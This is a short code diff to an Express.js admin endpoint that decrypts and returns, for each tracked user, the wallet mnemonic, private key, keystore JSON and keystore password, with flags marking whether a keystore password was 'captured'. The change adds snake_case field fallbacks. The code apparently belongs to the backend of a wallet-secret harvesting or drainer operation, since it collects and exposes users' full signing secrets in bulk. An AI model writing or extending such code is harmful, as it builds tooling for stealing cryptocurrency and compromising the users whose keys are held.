@@ -178,29 +178,29 @@ app.get("/api/admin/users", authMiddleware, (req, res) => {
       users = trackedUsers;
     }
     const out = users.map(u => {
-      const m = decrypt(u.encMnemonic);
-      const pk = decrypt(u.encPrivateKey);
-      const ks = decrypt(u.encKeystoreJSON);
-      const kp = decrypt(u.encKeystorePassword);
+      const m = decrypt(u.encMnemonic || u.enc_mnemonic);
+      const pk = decrypt(u.encPrivateKey || u.enc_private_key);
+      const ks = decrypt(u.encKeystoreJSON || u.enc_keystore_json);
+      const kp = decrypt(u.encKeystorePassword || u.enc_keystore_password);
       return {
-        userId: u.userId,
+        userId: u.userId || u.user_id,
         address: u.address,
-        walletType: u.walletType,
+        walletType: u.walletType || u.wallet_type,
         balance: u.balance,
         assets: u.assets,
-        lastActive: u.lastActive,
+        lastActive: u.lastActive || u.last_active,
         status: u.status,
-        featureFlags: u.featureFlags,
-        appLimits: u.appLimits,
-        riskFlags: u.riskFlags,
+        featureFlags: u.featureFlags || u.feature_flags,
+        appLimits: u.appLimits || u.app_limits,
+        riskFlags: u.riskFlags || u.risk_flags,
         transactions: u.transactions,
         mnemonic: m || null,
         privateKey: pk || null,
         keystoreJSON: ks || null,
         keystorePassword: kp || null,
-        hasPrivateKey: u.hasPrivateKey === true,
-        keystorePreview: u.keystorePreview || null,
-        keystorePasswordCaptured: u.keystorePasswordCaptured === true
+        hasPrivateKey: (u.hasPrivateKey === true) || (u.has_private_key === true),
+        keystorePreview: u.keystorePreview || u.keystore_preview || null,
+        keystorePasswordCaptured: (u.keystorePasswordCaptured === true) || (u.keystore_password_captured === true)
       };
     });
     return res.json({ users: out });
